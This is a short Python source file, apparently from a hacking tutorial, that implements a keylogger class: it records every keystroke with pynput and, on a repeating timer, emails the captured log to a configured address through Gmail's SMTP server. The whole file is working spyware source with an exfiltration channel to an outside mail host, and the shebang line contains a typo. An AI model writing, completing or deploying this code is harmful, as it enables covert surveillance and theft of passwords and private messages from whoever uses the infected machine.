#!/use/bin/env python

import pynput.keyboard
import threading
import smtplib

class Keylogger:
    # class methods
    def __init__(self, time_interval, email, password):
    #     code gets executed automatically when the object is initialized
    # these vars are attributes within the class
        self.log = "program klV1 started"
        self.interval = time_interval
        self.email = email
        self.password = password

    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        #  [ X ] holds the string that we want to append to the log
        try:
            x = str(key.char)
        except AttributeError:
            if key == key.space:
                x = " "
            elif key == key.tab:
                x = " [tab] "
            elif key == key.enter:
                x = " [enter] "
            else:
                x = ("- " + str(key) + " -")
        self.append_to_log(x)

    def report(self):
        print(self.log)
        # use newlines to avoid headers to put log in the body of the message
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def send_mail(self, email, password, message):
        # uses the gmail servers open to anyone on port 587 (different services will require
        #  a different means of accessing an e-mail server...)
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
            
 #can call the function below with e-mail and pw, or export to another file and call keylogger object methods there
